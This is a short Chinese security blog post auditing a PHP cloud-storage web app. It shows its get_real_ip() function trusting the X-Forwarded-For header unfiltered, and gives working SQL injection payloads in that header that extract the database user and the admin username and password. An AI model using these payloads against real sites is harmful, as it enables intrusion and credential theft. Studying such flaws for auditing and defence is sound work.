原创： wwt  合天智汇

  

![640.jpg](https://image.3001.net/images/20180801/1533088596_5b611354eeebf.jpg!small)  

官网：https://yun.aoaoao.me/  

/includes/function.php 36-52 行

function get_real_ip(){

$ip=false;

if(!empty($_SERVER["HTTP_CLIENT_IP"])){

$ip = $_SERVER["HTTP_CLIENT_IP"];

}

if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {

$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);

if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }

for ($i = 0; $i < count($ips); $i++) {

if (!eregi ("^(10|172\\.16|192\\.168)\\.", $ips[$i])) {

$ip = $ips[$i];

break;

}

}

}

return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);

}

获取HTTP_X_FORWARDED_FOR

HTTP_X_FORWARDED_FOR是可以用户自定义的

没做什么过滤 取出函数输出一波

![640.png](https://image.3001.net/images/20180801/1533088613_5b611365dc053.png!small)  

看到输出就知道了一切（其实不看也知道）(￣▽￣*)

  
![640.jpg](https://image.3001.net/images/20180801/1533088624_5b61137005a3b.jpg!small)  

全局查找get_real_ip() IP功能一般在用户登陆 注册 留言 这些是比较常见的

/includes/save.php 23-28 行

  
![640.png](https://image.3001.net/images/20180801/1533088635_5b61137bb89eb.png!small)  

INSERT 注入原理我这里就不讲了

带上 ming 参数 (post)

构造payload

X-Forwarded-For: 1.1.1.1',user(),'0',1,1); #

ming=123

  
![640-1.png](https://image.3001.net/images/20180801/1533088644_5b611384ecc70.png!small)  

爆用户名: X-Forwarded-For: 1.1.1.1',(select username from sd_user where
id=1),'0',uid,uid); #

爆密码: X-Forwarded-For: 1.1.1.1',(select pwdfrom sd_user where
id=1),'0',uid,uid); #

  
（注：本文属于合天原创投稿奖励，未经允许，禁止转载！）  

